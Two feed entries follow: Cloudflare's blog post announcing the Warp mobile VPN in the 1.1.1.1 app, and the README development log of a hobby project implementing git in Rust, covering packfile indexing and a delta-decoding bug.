<title>Warp – Mobile VPN</title>
<link>https://blog.cloudflare.com/1111-warp-better-vpn/</link>
<guid isPermaLink="true" >https://blog.cloudflare.com/1111-warp-better-vpn/</guid>
<description>&lt;img src=&quot;https://blog.cloudflare.com/content/images/2019/04/header-tile-1.1.1.1@2x-1.png&quot; class=&quot;kg-image&quot;/&gt;&lt;p&gt;April 1st is a miserable day for most of the Internet. While most days the Internet is full of promise and innovation, on “April Fools” a handful of elite tech companies decide to waste the time of literally billions of people with juvenile jokes that only they find funny.&lt;/p&gt;&lt;p&gt;Cloudflare has never been one for the traditional April Fools antics. Usually we just ignored the day and went on with our mission to help build a better Internet. Last year we decided to go the opposite direction launching a service that we hoped would benefit every Internet user: 1.1.1.1.&lt;/p&gt;
&lt;p&gt;The service's goal was simple — be the fastest, most secure, most privacy-respecting DNS resolver on the Internet. It was our first attempt at a consumer service. While we try not to be sophomoric, we're still geeks at heart, so we couldn't resist launching 1.1.1.1 on 4/1 — even though it was April Fools, Easter, Passover, and a Sunday when every media conversation began with some variation of: &quot;You know, if you're kidding me, you're dead to me.&quot;&lt;/p&gt;
&lt;h3 id=&quot;no-joke&quot;&gt;No Joke&lt;/h3&gt;
&lt;p&gt;We weren't kidding. In the year that's followed, we've been overwhelmed by the response. 1.1.1.1 has grown usage by 700% month-over-month and appears likely to soon become the second-largest public DNS service in the world — behind only Google (which has &lt;a href=&quot;https://www.dnsperf.com/#!dns-resolvers&quot;&gt;twice the latency&lt;/a&gt;, so we trust we’ll catch them too someday). We've helped champion new standards such as DNS over TLS and DNS over HTTPS, which ensure the privacy and security of the most foundational of Internet requests. And we've worked with great organizations like Mozilla to make it so these new standards could be easy to use and accessible to anyone anywhere.&lt;/p&gt;
&lt;img src=&quot;https://blog.cloudflare.com/content/images/2019/04/1.1.1.1-Screen-Record.gif&quot; class=&quot;kg-image&quot;/&gt;&lt;p&gt;On 11/11 — yes, again, geeky — we launched Cloudflare's first mobile app. The 1.1.1.1 App allowed anyone to easily take advantage of the speed, security, and privacy of the 1.1.1.1 DNS service on their phone. Internally, we had hoped that at least 10,000 people would use the app. We ended up getting a lot more than that. In the months that followed, millions of Android and iOS users have installed the app and now experience a faster, more secure, and more private Internet on their phones.&lt;/p&gt;
&lt;h3 id=&quot;super-secret-plan&quot;&gt;Super Secret Plan&lt;/h3&gt;
&lt;p&gt;Truth be told, the 1.1.1.1 App was really just a lead up to today. We had a plan on how we could radically improve the performance, security, and privacy of the mobile Internet well beyond just DNS. To pull it off, we needed to understand the failure conditions when a VPN app switched between cellular and WiFi, when it suffered signal degradation, tried to register with a captive portal, or otherwise ran into the different conditions that mobile phones experience in the field.&lt;/p&gt;
&lt;p&gt;More on that in a second. First, let’s all acknowledge that the mobile Internet could be so much better than it is today. TCP, the foundational protocol of the Internet, was never designed for a mobile environment. It literally does the exact opposite thing it should when you're trying to surf the Internet on your phone and someone nearby turns on the microwave or something else happens that causes packet loss. The mobile Internet could be so much better if we just upgraded its underlying protocols. There’s a lot of hope for 5G, but, unfortunately, it does nothing to solve the fact that the mobile Internet still runs on transport protocols designed for a wired network.&lt;/p&gt;
&lt;p&gt;Beyond that, our mobile phones carry some of our most personal communications. And yet, how confident are you that they are as secure and private as possible? While there are mobile VPNs that can ensure traffic sent from your phone through the Internet is encrypted, let’s be frank — VPNs suck, especially on mobile. They add latency, drain your battery, and, in many cases, are run by companies with motivations that are opposite to actually keeping your data private and secure.&lt;/p&gt;
&lt;h3 id=&quot;announcing-1-1-1-1-with-warp&quot;&gt;Announcing 1.1.1.1 with Warp&lt;/h3&gt;
&lt;img src=&quot;https://blog.cloudflare.com/content/images/2019/04/warp-illustration-update@2x.png&quot; class=&quot;kg-image&quot;/&gt;&lt;p&gt;Today we're excited to announce what we began to plan more than two years ago: the 1.1.1.1 App with Warp performance and security technology. We built Warp from the ground up to thrive in the harsh conditions of the modern mobile Internet. It began with our &lt;a href=&quot;https://www.cloudflare.com/press-releases/2017/cloudflare-acquires-neumob-to-supercharge-the-network-experience-end-to-end/&quot;&gt;acquisition of Neumob&lt;/a&gt; in November 2017. At the time, our CTO, John Graham-Cumming, wrote about how Neumob was part of our &quot;&lt;a href=&quot;https://blog.cloudflare.com/neumob-optimizing-mobile/&quot;&gt;Super Secret Master Plan&lt;/a&gt;.&quot; At the time he wrote:&lt;/p&gt;
&lt;p&gt;&quot;Ultimately, the Neumob software is easily extended to operate as a ‘VPN’ for mobile devices that can secure and accelerate all HTTP traffic from a mobile device (including normal web browsing and app API calls). Most VPN software, frankly, is awful. Using a VPN feels like a step backwards to the dial up era of obscure error messages, slow downs, and clunky software. It really doesn’t have to be that way.&quot;&lt;/p&gt;
&lt;p&gt;That's the vision we've been working toward ever since: extending Cloudflare's global network — now within a few milliseconds of the vast majority of the world's population — to help fix the performance and security of the mobile Internet.&lt;/p&gt;
&lt;h3 id=&quot;a-vpn-for-people-who-don-t-know-what-v-p-n-stands-for&quot;&gt;A VPN for People Who Don’t Know What V.P.N. Stands For&lt;/h3&gt;
&lt;p&gt;Technically, Warp is a VPN. However, we think the market for VPNs as it’s been imagined to date is severely limited. Imagine trying to convince a non-technical friend that they should install an app that will slow down their Internet and drain their battery so they can be a bit more secure. Good luck.&lt;/p&gt;
&lt;img src=&quot;https://blog.cloudflare.com/content/images/2019/04/Warp-On.png&quot; class=&quot;kg-image&quot;/&gt;&lt;p&gt;We built Warp because we’ve had those conversations with our loved ones too and they’ve not gone well. So we knew that we had to start with turning the weaknesses of other VPN solutions into strengths. Under the covers, Warp acts as a VPN. But now in the 1.1.1.1 App, if users decide to enable Warp, instead of just DNS queries being secured and optimized, all Internet traffic is secured and optimized. In other words, Warp is the VPN for people who don't know what &lt;a href=&quot;https://www.cloudflare.com/learning/vpn/what-is-a-vpn/&quot;&gt;V.P.N. stands for&lt;/a&gt;.&lt;/p&gt;
&lt;h3 id=&quot;secure-all-the-traffic-&quot;&gt;Secure All the Traffic…&lt;/h3&gt;
&lt;p&gt;This doesn't just apply to your web browser but to &lt;em&gt;all&lt;/em&gt; apps running on your phone. Any unencrypted connections are encrypted automatically and by default. Warp respects end-to-end encryption and doesn’t require you to install a root certificate or give Cloudflare any way to see any encrypted Internet traffic we wouldn’t have otherwise.&lt;/p&gt;
&lt;p&gt;Unfortunately, a lot of the Internet is still unencrypted. For that, Warp automatically adds encryption from your device to the edge of Cloudflare’s network — which isn’t perfect, but is all other VPNs do and it does address the largest threats typical Internet users face. One silver lining is that if you browse the unencrypted Internet through Warp, when it’s safe to do so, Cloudflare’s network can cache and compress content to improve performance and potentially decrease your data usage and mobile carrier bill.&lt;/p&gt;
&lt;h3 id=&quot;-while-making-it-faster-and-more-reliable&quot;&gt;…While Making It Faster and More Reliable&lt;/h3&gt;
&lt;p&gt;Security is table stakes. What really distinguishes Warp is performance and reliability. While other VPNs slow down the Internet, Warp incorporates all the work that the team from Neumob has done to improve mobile Internet performance. We’ve built Warp around a UDP-based protocol that is optimized for the mobile Internet. We also leveraged Cloudflare’s massive global network, allowing Warp to connect with servers within milliseconds of most the world’s Internet users. With our network’s direct peering connections and uncongested paths we can deliver a great experience around the world. Our tests have shown that Warp will often significantly increase Internet performance. Generally, the worse your network connection the better Warp should make your performance.&lt;/p&gt;
&lt;img src=&quot;https://blog.cloudflare.com/content/images/2019/04/cloudflare-network-map-1.png&quot; class=&quot;kg-image&quot;/&gt;&lt;p&gt;And reliability is improved as well. While Warp can’t eliminate mobile dead spots, the protocol is designed to recover from loss faster. That makes that spot where your phone loses signal on the train when you’re commuting in from work a bit less annoying.&lt;/p&gt;
&lt;p&gt;We also knew it was critical that we ensure Warp doesn’t meaningfully increase your battery usage. We built Warp around WireGuard, a modern, efficient VPN protocol that is much more efficient than legacy VPN protocols. We’ve also worked to minimize any excess use of your phone’s radio through retransmits which, if you’ve ever been somewhere with spotty mobile coverage, you know can heat up your phone and quickly burn through your phone’s battery. Warp is designed to minimize that.&lt;/p&gt;
&lt;h3 id=&quot;how-much-does-it-cost&quot;&gt;How Much Does It Cost?&lt;/h3&gt;
&lt;p&gt;Finally, we knew that if we really wanted Warp to be something that all our less-technical friends would use, then price couldn’t be a barrier to adoption. The basic version of Warp is included as an option with the 1.1.1.1 App for &lt;strong&gt;free&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;We’re also working on a premium version of Warp — which we call Warp+ — that will be even faster by utilizing Cloudflare’s virtual private backbone and &lt;a href=&quot;https://www.cloudflare.com/products/argo-smart-routing/&quot;&gt;Argo technology&lt;/a&gt;. We will charge a low monthly fee for those people, like many of you reading this blog, who want even more speed. The cost of Warp+ will likely vary by region, priced in a way that ensures the fastest possible mobile experience is affordable to as many people as possible.&lt;/p&gt;
&lt;p&gt;When John hinted more than two years ago that we wanted to build a VPN that didn't suck, that's exactly what we've been up to. But it's more than just the technology, it's also the policy of how we're going to run the network and who we're going to make the service accessible to.&lt;/p&gt;
&lt;h3 id=&quot;what-s-the-catch&quot;&gt;What’s the Catch?&lt;/h3&gt;
&lt;p&gt;Let’s acknowledge that many corners of the consumer VPN industry are really awful so it’s a reasonable question whether we have some ulterior motive. That many VPN companies pretend to keep your data private and then sell it to help target you with advertising is, in a word, disgusting. That is not Cloudflare’s business model and it never will be. The 1.1.1.1 App with Warp will continue to have &lt;a href=&quot;https://developers.cloudflare.com/1.1.1.1/commitment-to-privacy/&quot;&gt;all the privacy protections that 1.1.1.1 launched with&lt;/a&gt;, including:&lt;/p&gt;
&lt;p&gt;1. We don't write user-identifiable log data to disk;&lt;/p&gt;
&lt;p&gt;2. We will never sell your browsing data or use it in any way to target you with advertising data;&lt;/p&gt;
&lt;p&gt;3. Don’t need to provide any personal information — not your name, phone number, or email address — in order to use the 1.1.1.1 App with Warp; and&lt;/p&gt;
&lt;p&gt;4. We will regularly hire outside auditors to ensure we're living up to these promises.&lt;/p&gt;
&lt;h3 id=&quot;this-sounds-too-good-to-be-true&quot;&gt;This Sounds Too Good To Be True&lt;/h3&gt;
&lt;p&gt;That’s exactly what I thought when I read about the launch of Gmail exactly 15 years ago today. At the time it was hard to believe an email service could exist with effectively no storage cap or fees. What I didn’t understand at the time was that Google had done such a good job figuring out how to store data cheaply and efficiently that what seemed impossible to the rest of the world seemed like a no-brainer to them. Of course, advertising is Google’s business model, it’s not Cloudflare’s, so it’s not a perfect analogy.&lt;/p&gt;
&lt;p&gt;There are few companies that have the breadth, reach, scale, and flexibility of Cloudflare's network. We don’t believe there are any such companies that aren't primarily motivated by selling user data or advertising. We realized a few years back that providing a VPN service wouldn’t meaningfully change the costs of the network we're already running successfully. That meant if we could pull off the technology then we could afford to offer this service.&lt;/p&gt;
&lt;p&gt;Hokey as it sounds, the primary reason we built Warp is that our mission is to help build a better Internet — and the mobile Internet wasn’t as fast or secure as it could be and VPNs all suck. Time and time again we've watched people sit around and talk about how the Internet could be better if someone would just act. We're in a position to act, and we've acted. We &lt;a href=&quot;https://blog.cloudflare.com/introducing-universal-ssl/&quot;&gt;made encryption free for all our customers&lt;/a&gt; and doubled the size of the encrypted web in the process, we've &lt;a href=&quot;https://blog.cloudflare.com/always-on-ipv6/&quot;&gt;pushed the adoption of IPv6&lt;/a&gt;, we've &lt;a href=&quot;https://blog.cloudflare.com/automatically-provision-and-maintain-dnssec/&quot;&gt;made DNSSEC easy&lt;/a&gt;, and we were the first to &lt;a href=&quot;https://blog.cloudflare.com/cloudflares-impact-on-the-http-2-universe/&quot;&gt;turn HTTP/2 up at scale&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;This is our nature: find the biggest problems on the Internet and do the right thing to solve them. And, if you look at the biggest problem on the Internet today, it's that the mobile web is too insecure and too slow, and current VPN solutions come with massive performance penalties and, worse, often don’t respect users’ privacy.&lt;/p&gt;
&lt;p&gt;Once we realized that building Warp was technically and financially possible, it really became a no-brainer for us. At Cloudflare we strive to build technologies for the entire Internet, not just the handful of fellow techies in Silicon Valley who find April Fools shenanigans amusing. Helping build a better Internet is what motivates the sort of great, empathetic, principled, and curious engineers we hire at Cloudflare.&lt;/p&gt;
&lt;h3 id=&quot;ok-sure-but-you-re-still-a-profit-seeking-company&quot;&gt;Ok, Sure, But You’re Still a Profit-Seeking Company&lt;/h3&gt;
&lt;p&gt;Fair enough, and we think that the 1.1.1.1 App with Warp will be a good business for us. There are three primary ways this makes financial sense. The first, and most direct, is the aforementioned Warp+ premium service that you can upgrade to for even faster performance. Cloudflare launched our B2B service with a freemium model and it’s worked extremely well for us. We understand freemium and we are excited to extend our experience with it into the consumer space.&lt;/p&gt;
&lt;img src=&quot;https://blog.cloudflare.com/content/images/2019/04/warp-.png&quot; class=&quot;kg-image&quot;/&gt;&lt;p&gt;Second, we think there’s an exciting opportunity in the enterprise VPN space. While companies require their employees to install and use VPNs, even the next generation of cloud VPNs are pretty terrible. Their client software slows everything down and drains your battery. We think the best way to build the best enterprise VPN is to first build the best consumer VPN and let millions of users kick the tires. Imagine if you actually looked forward to logging in to your corporate VPN. If you're a company interested in working closely to realize that dream, &lt;a href=&quot;https://www.cloudflare.com/plans/enterprise/contact/&quot;&gt;don’t hesitate to reach out and we’ll let you in on our roadmap&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Finally, &lt;a href=&quot;https://www.cloudflare.com/&quot;&gt;Cloudflare’s core business&lt;/a&gt; is about making our customers content and applications on the Internet fast and secure. While we strive for Warp to make the entire Internet fast, Cloudflare-powered sites and apps will be even faster still. By having software running on both sides of an Internet connection we can make significant optimizations that wouldn’t otherwise be possible. Going forward, we plan to add local device differential compression (think Railgun on your phone), more advanced header compression, intelligently adaptive congestion control, and multipath routing. All those things are easier to provide when someone is accessing a Cloudflare customer through their phone running Warp. So the more people who install Warp, the more valuable Cloudflare’s core services become.&lt;/p&gt;
&lt;h3 id=&quot;how-do-i-sign-up&quot;&gt;How Do I Sign Up?&lt;/h3&gt;
&lt;p&gt;We wanted to roll out Warp to the entire Internet on April 1, 2019 with no strings attached. Our Site Reliability Engineering team vetoed that idea. They reminded us that even Google, when they launched Gmail (also on April 1), curated the list of who could get on when. And, listening to them, that clearly makes sense. We want to make sure people have a great experience and our network scales well as we onboard everyone.&lt;/p&gt;
&lt;p&gt;Truth be told, we’re also not quite ready. While our team has been working for months to get the new 1.1.1.1 App with Warp ready to launch, including working through the final hours before the launch, we just made the call that there are still too many edge cases that we’re not proud of to start rolling it out to users. Nothing we can’t solve, but it’s going to take a bit longer than we’d hoped. The great thing about a hard deadline like April 1 is that it motivates a team — and our whole team has been doing great work to get this ready — the challenging thing is that you can’t move it.&lt;/p&gt;
&lt;p&gt;So, beginning today, what you can do is claim your place in line to be among the first to get Warp. If you already have the 1.1.1.1 App on your phone, you can update it through the &lt;a href=&quot;https://itunes.apple.com/us/app/1-1-1-1-faster-internet/id1423538627?mt=8&quot;&gt;Apple App Store&lt;/a&gt; or the &lt;a href=&quot;https://play.google.com/store/apps/details?id=com.cloudflare.onedotonedotonedotone&amp;amp;hl=en_US&quot;&gt;Google Play Store&lt;/a&gt;. If you don’t yet have the 1.1.1.1 App you can download it for free from &lt;a href=&quot;https://itunes.apple.com/us/app/1-1-1-1-faster-internet/id1423538627?mt=8&quot;&gt;Apple&lt;/a&gt; or &lt;a href=&quot;https://play.google.com/store/apps/details?id=com.cloudflare.onedotonedotonedotone&amp;amp;hl=en_US&quot;&gt;Google&lt;/a&gt;. Once you’ve done that you’ll see an option to claim your place in line for Warp. As we start onboarding people, your position in line will move up. When it’s your turn we’ll send you a notification and you’ll be able to enable Warp to experience a faster, more secure, more private Internet for yourself.&lt;/p&gt;
&lt;img src=&quot;https://blog.cloudflare.com/content/images/2019/04/Warp-Queue.png&quot; class=&quot;kg-image&quot;/&gt;&lt;p&gt;And, don't worry, if you'd like to keep using the 1.1.1.1 App for DNS performance and security only, that will remain the default for free for anyone who's already installed it. And, for future installs, you'll always be able to downgrade to that option for free if, for whatever reason, you don't want the benefits of Warp.&lt;/p&gt;
&lt;p&gt;We expect that we’ll begin inviting people on the waitlist to try Warp over the coming weeks. And, assuming demand stays within our forecasts, hope to have it available to everyone on the waitlist by the end of July.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Helping Build a Better Internet&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;At Cloudflare our mission is to help build a better Internet. We take that mission very seriously, even on days when the rest of the tech industry is joking around. We’ve lived up to that mission a &lt;a href=&quot;https://w3techs.com/technologies/history_overview/proxy&quot;&gt;significant portion of the world’s content creators&lt;/a&gt;. Our whole team is proud that today, for the first time, we’ve extended the scope of that mission meaningfully to the billions of other people who use the Internet every day.&lt;/p&gt;

<title>Git implemented in Rust</title>
<link>https://github.com/chrisdickinson/git-rs</link>
<guid isPermaLink="true" >https://github.com/chrisdickinson/git-rs</guid>
<description>&lt;div class=&quot;Box-body&quot;&gt;
&lt;article class=&quot;markdown-body entry-content p-5&quot; itemprop=&quot;text&quot;&gt;
&lt;p&gt;Implementing git in rust for fun and education!&lt;/p&gt;
&lt;p&gt;This is actually my second stab at it, so big blocks will land in place from my first attempt. I'm trying again this year after reading more of &quot;Programming Rust&quot; (Blandy, Orendorff).&lt;/p&gt;
&lt;h2&gt;TODO&lt;/h2&gt;
&lt;hr/&gt;&lt;h2&gt;PLAN&lt;/h2&gt;
&lt;h3&gt;2019-02-08 Update&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;It's been a minute!&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;As you might have seen, figuring out packfile indexing has forced a lot of changes on the repo.
&lt;ul&gt;&lt;li&gt;There's now a &lt;code&gt;src/pack/read.rs&lt;/code&gt; file that holds generic read implementations for any &lt;code&gt;BufRead + Seek&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;The signature of the &lt;code&gt;Storage&lt;/code&gt; trait changed -- instead of returning a boxed read object, it now accepts a &lt;code&gt;Write&lt;/code&gt; destination.&lt;/li&gt;
&lt;li&gt;Further, &lt;code&gt;Storage&lt;/code&gt; is now &lt;code&gt;Queryable&lt;/code&gt; (a better name!).
&lt;ul&gt;&lt;li&gt;Because we moved from returning a Box to accepting generic &lt;code&gt;Write&lt;/code&gt;, we could no longer box &lt;code&gt;Queryable&lt;/code&gt;s.
&lt;ul&gt;&lt;li&gt;I didn't know this about Rust, so TIL!&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;StorageSet&lt;/code&gt; objects had to be rethought as a result -- they could no longer contain Box'd &lt;code&gt;Storage&lt;/code&gt; objects.
&lt;ul&gt;&lt;li&gt;Instead, we put the compiler to work -- because storage sets are known at compile time, I implemented &lt;code&gt;Queryable&lt;/code&gt; for the unit type, &lt;code&gt;()&lt;/code&gt;, two types &lt;code&gt;(S, T)&lt;/code&gt;, and arrays of single types &lt;code&gt;Vec&amp;lt;T&amp;gt;&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;This means that a &lt;code&gt;StorageSet&lt;/code&gt; may hold a single, top-level &lt;code&gt;Queryable&lt;/code&gt;, which might contain nested heterogenous &lt;code&gt;Queryable&lt;/code&gt; definitions.
&lt;ul&gt;&lt;li&gt;It gives me warm, fuzzy feelings 💞&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;You might also note that we're &lt;em&gt;not actually done&lt;/em&gt; indexing packfiles. 😱
&lt;ul&gt;&lt;li&gt;Here's the sitch: in order to create a packfile index, you have to run a CRC32 over the &lt;strong&gt;compressed&lt;/strong&gt; bytes in the packfile.&lt;/li&gt;
&lt;li&gt;The &lt;code&gt;ZlibDecoder&lt;/code&gt; will pull more bytes from the underlying stream than it needs, so you can't take the route of handing it a &lt;code&gt;CrcReader&lt;/code&gt; and get good results.&lt;/li&gt;
&lt;li&gt;It's got to be a multi-pass deal.
&lt;ul&gt;&lt;li&gt;The current plan is: run one pass to get offsets, un-delta'd shas and types.&lt;/li&gt;
&lt;li&gt;Run a second pass to resolve CRCs and decompress deltas. This can be done in parallel.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h3&gt;2019-01-23 Update&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;It's time to start indexing packfiles.
&lt;ul&gt;&lt;li&gt;This'll let us start talking to external servers and cloning things!&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;However, it's kind of a pain.
&lt;ul&gt;&lt;li&gt;Packfiles (viewed as a store) aren't hugely useful until you have an index, so I had designed them as an object that takes an optional index from outside.
&lt;ul&gt;&lt;li&gt;My thinking was that if an index was not given, we would build one in-memory.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;That just blew up in my face, a little bit. 💥&lt;/li&gt;
&lt;li&gt;In order to build an index from a packfile you have to iterate over all of the objects.
&lt;ul&gt;&lt;li&gt;For each object, you want to record the offset and the SHA1 id of the object at that offset.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;However&lt;/strong&gt;, the object might be an offset or a reference delta.
&lt;ul&gt;&lt;li&gt;That means that in order to index a packfile, you've got to be able to read delta'd objects at offsets within the packfile (implying you already have the &lt;code&gt;Packfile&lt;/code&gt; instance created) and outside of the packfile ( implying you have a &lt;code&gt;StorageSet&lt;/code&gt;.)&lt;/li&gt;
&lt;li&gt;In other words: my assumptions about the program design are wrong.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;So, in the next day or so I'll be reversing course.
&lt;ul&gt;&lt;li&gt;It should be possible to produce a &lt;code&gt;Packfile&lt;/code&gt; as a non-store object &lt;em&gt;and&lt;/em&gt; iterate over it.&lt;/li&gt;
&lt;li&gt;The &quot;store&quot; form of a packfile should be the combination of a &lt;code&gt;Packfile&lt;/code&gt; and an &lt;code&gt;Index&lt;/code&gt; (a &lt;code&gt;PackfileStore&lt;/code&gt;.)
&lt;ul&gt;&lt;li&gt;This means I'll be splitting the logic of &lt;code&gt;src/stores/mmap_pack&lt;/code&gt; into &quot;sequential packfile reads&quot; and &quot;random access packfile reads (with an index.)&quot;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;It's fun to be wrong 🎉&lt;/li&gt;
&lt;/ul&gt;&lt;hr/&gt;&lt;h3&gt;2019-01-21 Update&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;Well, that was a fun bug. Let's walk through it, shall we?
&lt;ul&gt;&lt;li&gt;This &lt;em&gt;occasionally&lt;/em&gt; showed up when a delta would decode another delta'd object.
&lt;ul&gt;&lt;li&gt;I found a hash that would reliably fail to load.&lt;/li&gt;
&lt;li&gt;We'd fail the read because the incoming base object would not match the 2nd delta's &quot;base size&quot;. &lt;a href=&quot;https://github.com/chrisdickinson/git-rs/blob/12afab5462f67c8670671177b4053aa566b45338/src/delta.rs#L45-L47&quot;&gt;Here&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Removing the check to see if I got the deltas wrong would cause the thread to panic -- the delta's base size &lt;em&gt;wasn't a lie&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;First, I switched back to my old mmap-less packfile implementation, because I recently touched that code. &quot;Revert the thing you touched last&quot; is a winning strategy in these cases: doesn't cost expensive thinking, quickly puts bounds around the bug.
&lt;ul&gt;&lt;li&gt;Alas, the old packfile implementation &lt;em&gt;also&lt;/em&gt; had this bug. &lt;strong&gt;No dice.&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;I compared the output of this git implementation to my &lt;a href=&quot;https://github.com/chrisdickinson/git-odb-pack&quot;&gt;JS implementation&lt;/a&gt;.
&lt;ul&gt;&lt;li&gt;I confirmed that the output of the JS implementation worked by comparing its output for the hash of concern to vanilla git.&lt;/li&gt;
&lt;li&gt;After confirming that, I logged out the offsets being read from the file and the expected sizes. I compared this to similar debugging output I added to &lt;code&gt;git-rs&lt;/code&gt;.
&lt;ul&gt;&lt;li&gt;The offsets are the bound values sent into &lt;a href=&quot;https://github.com/chrisdickinson/git-rs/blob/eff4c6de1bd15cb0d28581e4da17035dbf9e8596/src/stores/mmap_pack.rs#L41&quot;&gt;the packfile&lt;/a&gt;. For the outermost read (&quot;Give me the object represented by &lt;code&gt;eff4c6de1bd15cb0d28581e4da17035dbf9e8596&lt;/code&gt;&quot;), the offsets come from the packfile index.&lt;/li&gt;
&lt;li&gt;For &lt;code&gt;OFS_DELTA&lt;/code&gt; (&quot;offset delta&quot;) types, the start offset is obtained by reading a &lt;a href=&quot;https://developers.google.com/protocol-buffers/docs/encoding#varints&quot; rel=&quot;nofollow&quot;&gt;varint&lt;/a&gt; from the packfile and subtracting it from the current start offset.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;The offsets and expected sizes matched!
&lt;ul&gt;&lt;li&gt;This meant that:
&lt;ol&gt;&lt;li&gt;I was reading the correct data from the packfile&lt;/li&gt;
&lt;li&gt;I was reading varints correctly&lt;/li&gt;
&lt;li&gt;The bug must be in the application of the delta to a base object&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;From there I added logging above &lt;a href=&quot;https://github.com/chrisdickinson/git-rs/blob/eff4c6de1bd15cb0d28581e4da17035dbf9e8596/src/delta.rs#L133-L140&quot;&gt;these state transitions&lt;/a&gt;, noting the particulars of the operation.
&lt;ul&gt;&lt;li&gt;I added the same logging to the JS implementation, and found that (aside from totally bailing out ahead of the 2nd delta application) the commands were the same.&lt;/li&gt;
&lt;li&gt;So it wasn't even that my delta code was wrong: it was my &lt;code&gt;Read&lt;/code&gt; state machine.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;At this point, I was like: &quot;This is a read state machine bug. &lt;a href=&quot;https://66.media.tumblr.com/cd7765c4bfbe7d124ad2b7bf344b9588/tumblr_p902faD2n61wzvt9qo1_500.gif&quot; rel=&quot;nofollow&quot;&gt;I know this&lt;/a&gt;.&quot;
&lt;ul&gt;&lt;li&gt;So, one of the things this state machine does is carefully bail out if it can't &lt;a href=&quot;https://github.com/chrisdickinson/git-rs/blob/eff4c6de1bd15cb0d28581e4da17035dbf9e8596/src/delta.rs#L154-L161&quot;&gt;write all of the bytes for a command&lt;/a&gt;. (&quot;If there remains an &lt;code&gt;extent&lt;/code&gt; to write, record the next state and break the loop.&quot;)&lt;/li&gt;
&lt;li&gt;However, at this point we've already consumed the last command. There are no more instructions.&lt;/li&gt;
&lt;li&gt;So if this function were to be called again, ...
&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/chrisdickinson/git-rs/commit/1442539cd01b7140ff2f58bc5df39e4686bd6843&quot;&gt;The fix&lt;/a&gt; turned out to be simple, as these fixes usually are.
&lt;ul&gt;&lt;li&gt;(I need to write a test for this, I know. I know. Pile your shame on me.)&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;So &lt;a href=&quot;https://thumbs.gfycat.com/PiercingSnarlingArabianhorse-size_restricted.gif&quot; rel=&quot;nofollow&quot;&gt;what did we learn&lt;/a&gt;?
&lt;ul&gt;&lt;li&gt;Always test your state machines, folks.&lt;/li&gt;
&lt;li&gt;(I've said it once, and I'm saying it again.) Malleable reference implementations will save your bacon.
&lt;ul&gt;&lt;li&gt;Make sure you can trust your reference implementation.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Anyway. The tree reader works now! 🌲🌳🌲&lt;/li&gt;
&lt;/ul&gt;&lt;hr/&gt;&lt;h3&gt;2019-01-19 Update&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;It's slightly faster! 🎉
&lt;ul&gt;&lt;li&gt;mmap sped things along nicely, shaving 20ms off of our runtime.&lt;/li&gt;
&lt;li&gt;We're still reliably &lt;em&gt;slower&lt;/em&gt; than git, though. It might be because we load the refset immediately.&lt;/li&gt;
&lt;li&gt;I kept the immutable &quot;file per read&quot; packfile store around; I think it may come in handy in the future.&lt;/li&gt;
&lt;li&gt;It would be excellent to capture this as a benchmark instead of running it ad-hoc.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;I integrated the tree walking iterator and got a nice surprise:
&lt;ul&gt;&lt;li&gt;There's a bug in my OFS delta code!&lt;/li&gt;
&lt;li&gt;This is interesting, because it only appears for certain blobs in certain repositories.
&lt;ul&gt;&lt;li&gt;Otherwise other OFS deltas seem to resolve cleanly.&lt;/li&gt;
&lt;li&gt;Case in point: many of the commits I load as a test of the commit walk-er are OFS-delta'd.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Also of note: I've split from &lt;code&gt;src/bin.rs&lt;/code&gt; into dedicated binaries for tree walking and commit walking.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Today's theme: isolate the bug in a test case.
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;EOD Update&lt;/strong&gt;: It's really helpful to have a reference implementation.&lt;/li&gt;
&lt;li&gt;I've confirmed that the reference implementation &lt;em&gt;can read&lt;/em&gt; the object that breaks this project.
&lt;ul&gt;&lt;li&gt;We are reading the same offsets, as well (phew)&lt;/li&gt;
